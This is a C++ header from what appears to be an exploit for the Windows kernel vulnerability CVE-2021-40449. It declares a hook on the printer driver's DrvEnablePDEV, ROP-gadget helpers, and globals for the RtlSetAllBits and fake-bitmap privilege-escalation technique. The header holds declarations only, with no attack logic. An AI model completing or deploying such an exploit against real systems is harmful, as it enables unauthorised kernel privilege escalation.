#pragma once
#include <windows.h>
#include <iostream>
#include <vector>
#include <winddi.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include "include/common/memtools.hpp"
#include "include/common/gadget.hpp"

namespace CVE_2021_40449
{


    typedef BOOL(*DrvEnableDriver_t)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded);
    typedef DHPDEV(*DrvEnablePDEV_t)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
    typedef VOID(*VoidFunc_t)();

    inline DWORD64 rtlSetAllBits, fakeRtlBitMapAddr;

    inline HMODULE kernelModule, ntdllModule;
    inline HANDLE hPrinter;
    inline LPWSTR printerName;
    inline DrvEnablePDEV_t oldFuncPtr;

    bool initAPI();
    bool findPrinters(DrvEnablePDEV_t hookfunc);
} // namespace CVE_2021_40449